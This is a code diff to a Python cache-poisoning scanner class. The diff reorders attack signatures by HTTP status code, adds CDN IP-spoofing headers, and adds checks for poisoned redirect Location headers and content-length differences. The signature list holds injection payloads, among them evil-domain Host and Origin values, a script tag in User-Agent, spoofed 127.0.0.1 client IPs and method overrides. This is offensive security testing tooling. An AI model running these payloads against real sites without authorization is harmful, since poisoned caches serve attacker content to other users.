@@ -11,8 +11,50 @@ class Poisoner:
         self.baseline = baseline
         self.headers = headers or {}
         self.payload_id = str(uuid.uuid4())[:8]
-        # Advanced poisoning signatures based on public writeups (HackerOne, Bugcrowd)
-        self.signatures = [
+        
+        # NEW: Adjust testing strategy based on status code
+        self.is_404 = baseline.status == 404
+        self.is_redirect = baseline.status in [301, 302, 307, 308]
+        
+        # Filter signatures based on status code
+        self.signatures = self._get_signatures_for_status(baseline.status)
+
+    def _get_signatures_for_status(self, status: int) -> List[Dict]:
+        """Get relevant signatures based on baseline status code"""
+        all_sigs = self._get_all_signatures()
+        
+        if status == 404:
+            # Prioritize reflection-based attacks for 404s
+            priority_names = [
+                "X-Forwarded-Host", "X-Host", "X-Original-URL", 
+                "Origin-Reflect", "Referer-Poison",
+                "Path-Dot-Segment", "Host-Newline-Injection"
+            ]
+            return [s for s in all_sigs if s.get('name') in priority_names] + \
+                   [s for s in all_sigs if s.get('name') not in priority_names]
+        
+        elif status in [301, 302, 307, 308]:
+            # Prioritize Location header poisoning for redirects
+            priority_names = [
+                "X-Forwarded-Host", "X-Host", "X-Forwarded-Proto",
+                "X-Original-Host", "Base-Url"
+            ]
+            return [s for s in all_sigs if s.get('name') in priority_names] + \
+                   [s for s in all_sigs if s.get('name') not in priority_names]
+        
+        elif status == 405:
+            # Prioritize method override for 405
+            priority_names = [
+                "Method-Override-POST", "Method-Override-PUT",
+                "X-HTTP-Method-Override", "CPDoS-HMO-Connect"
+            ]
+            return [s for s in all_sigs if s.get('name') in priority_names] + \
+                   [s for s in all_sigs if s.get('name') not in priority_names]
+        
+        return all_sigs
+
+    def _get_all_signatures(self) -> List[Dict]:
+        return [
             # Host Header Manipulation
             {"name": "X-Forwarded-Host", "header": "X-Forwarded-Host", "value": f"evil-{self.payload_id}.com"},
             {"name": "X-Host", "header": "X-Host", "value": f"evil-{self.payload_id}.com"},
@@ -34,7 +76,6 @@ class Poisoner:
             {"name": "Valid-User-Agent", "header": "User-Agent", "value": f"<script>alert('{self.payload_id}')</script>"},
             {"name": "Origin-Reflect", "header": "Origin", "value": f"https://evil-{self.payload_id}.com"},
             {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
-            {"name": "Accept-Language", "header": "Accept-Language", "value": f"en-evil-{self.payload_id}"},
             
             # Path Normalization / Traversal (User Requested)
             {"name": "Backslash-Path-Replace", "type": "path", "mutation": "backslash_replace"},
@@ -43,13 +84,16 @@ class Poisoner:
             # Fat GET (Body Poisoning)
             {"name": "Fat-GET", "type": "fat_get", "header": "X-Poison-Fat", "value": f"evil-{self.payload_id}"},
 
-            # CDN / IP Forwarding
+            # CDN / IP Forwarding - ADDED NEW HEADERS
             {"name": "Fastly-Client-IP", "header": "Fastly-Client-IP", "value": "8.8.8.8"},
             {"name": "True-Client-IP", "header": "True-Client-IP", "value": "127.0.0.1"},
             {"name": "CF-Connecting-IP", "header": "CF-Connecting-IP", "value": "127.0.0.1"},
             {"name": "X-Real-IP", "header": "X-Real-IP", "value": "127.0.0.1"},
             {"name": "X-Forwarded-For-IP", "header": "X-Forwarded-For", "value": "127.0.0.1"},
             {"name": "Client-IP", "header": "Client-IP", "value": "127.0.0.1"},
+            {"name": "X-Akamai-Edgescape", "header": "X-Akamai-Edgescape", "value": f"poison={self.payload_id}"},
+            {"name": "X-Azure-ClientIP", "header": "X-Azure-ClientIP", "value": "127.0.0.1"},
+            {"name": "X-Azure-SocketIP", "header": "X-Azure-SocketIP", "value": "127.0.0.1"},
             
             # Method Override (Behavioral)
             {"name": "Method-Override-POST", "type": "method_override", "header": "X-HTTP-Method-Override", "value": "POST"},
@@ -116,7 +160,8 @@ class Poisoner:
             # === Vary Header Exploitation ===
             {"name": "Accept-Encoding-Vary", "header": "Accept-Encoding", "value": f"gzip;poison={self.payload_id}"},
             {"name": "Accept-Vary", "header": "Accept", "value": f"text/html;version={self.payload_id}"},
-            {"name": "Cookie-Vary", "header": "Cookie", "value": f"cache_poison={self.payload_id}"},
+            # FIX: Cookie-Vary uses quoted value
+            {"name": "Cookie-Vary", "header": "Cookie", "value": f"cache_poison=\"{self.payload_id}\""},
 
             # === Referer-based Cache Keys ===
             {"name": "Referer-Poison", "header": "Referer", "value": f"https://evil-{self.payload_id}.com/"},
@@ -253,6 +298,13 @@ class Poisoner:
 
     async def _attempt_poison(self, client: HttpClient, signature: Dict[str, str]) -> Optional[Dict]:
         cache_buster = f"cb={int(time.time())}_{random.randint(1000,9999)}"
+        
+        # NEW: Skip certain payloads for certain status codes
+        if self.baseline.status == 404:
+            # Skip method override on 404s (meaningless)
+            if signature.get("type") == "method_override":
+                logger.debug(f"Skipping {signature['name']} on 404 endpoint")
+                return None
         headers = self.headers.copy()
         
         # Determine URLs based on signature type
@@ -369,6 +421,22 @@ class Poisoner:
         if not resp:
             return
 
+        if self.is_redirect:
+            # For redirects, check Location header specifically
+            if resp and resp.get('headers', {}).get('Location'):
+                location = resp['headers']['Location']
+                if signature['value'] in location or self.payload_id in location:
+                    msg = f"CRITICAL: Location header poisoned on redirect: {location}"
+                    logger.critical(msg)
+                    return {
+                        "url": self.baseline.url,
+                        "vulnerability": "RedirectPoisoning",
+                        "details": msg,
+                        "signature": signature,
+                        "severity": "CRITICAL",
+                        "location_header": location
+                    }
+
         # Optimization: If the "poisoned" response is identical to the baseline, 
         # it likely means the server normalized the request or ignored the header/method.
         # This prevents "Backslash" or "Method Override" false positives where the 
@@ -425,9 +493,16 @@ class Poisoner:
                              logger.debug(f"Ignored {signature['name']} - Content length identical to fresh baseline ({len_verify} bytes). Likely benign dynamic content.")
                              return None
                          
-                         # Optional: Tolerance check (e.g., < 20 bytes diff)
-                         if abs(len_fresh - len_verify) < 20:
-                             logger.debug(f"Ignored {signature['name']} - Content length similar to fresh baseline (diff {abs(len_fresh - len_verify)}). Likely benign.")
+                         # NEW: Calculate percentage difference, not just absolute
+                         if len_fresh > 0:
+                             diff_percent = abs(len_fresh - len_verify) / len_fresh * 100
+                         else:
+                             diff_percent = 0 if len_verify == 0 else 100
+                         
+                         # If difference is < 5% OR < 50 bytes, likely benign
+                         if diff_percent < 5 or abs(len_fresh - len_verify) < 50:
+                             logger.debug(f"Ignored {signature['name']} - Content length similar "
+                                         f"({diff_percent:.1f}% diff, {abs(len_fresh - len_verify)} bytes)")
                              return None
                      
                      if fresh_hash != self.baseline.body_hash:
